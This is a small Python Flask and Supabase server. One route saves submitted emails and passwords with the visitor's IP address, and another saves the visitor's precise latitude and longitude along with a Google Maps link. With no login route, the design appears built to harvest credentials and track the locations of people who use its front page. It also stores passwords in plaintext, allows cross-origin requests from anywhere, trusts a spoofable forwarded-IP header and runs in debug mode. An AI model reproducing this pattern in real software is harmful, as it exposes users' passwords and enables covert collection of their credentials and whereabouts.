import os

from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
from supabase import create_client

app = Flask(__name__)
CORS(app)

SUPABASE_URL = os.environ["SUPABASE_URL"]
SUPABASE_SECRET_KEY = os.environ["SUPABASE_SECRET_KEY"]

supabase = create_client(
    SUPABASE_URL,
    SUPABASE_SECRET_KEY
)


def get_client_ip():
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.remote_addr


@app.route("/", methods=["GET"])
def home():
    return render_template("fronted.html")


@app.route("/register", methods=["POST"])
def register():
    data = request.get_json(silent=True) or {}

    email = data.get("email")
    password = data.get("password")

    if not email or not password:
        return jsonify({
            "error": "Email and password are required"
        }), 400

    try:
        supabase.table("users").insert({
            "email": email,
            "password": password,
            "ip_address": get_client_ip()
        }).execute()

        return "", 200

    except Exception as error:
        print("SUPABASE ERROR:", error, flush=True)
        return jsonify({
            "error": "Could not save data"
        }), 500


@app.route("/locations", methods=["POST"])
def save_location():
    data = request.get_json(silent=True) or {}

    latitude = data.get("latitude")
    longitude = data.get("longitude")

    if latitude is None or longitude is None:
        return "", 400

    try:
        supabase.table("locations").insert({
            "ip_address": get_client_ip(),
            "latitude": latitude,
            "longitude": longitude,
            "location_link": f"https://www.google.com/maps?q={latitude},{longitude}"
        }).execute()

        return jsonify({"status": "ok"}), 200

    except Exception as error:
        print("SUPABASE ERROR:", error, flush=True)
        return "", 500


if __name__ == "__main__":
    app.run(debug=True)
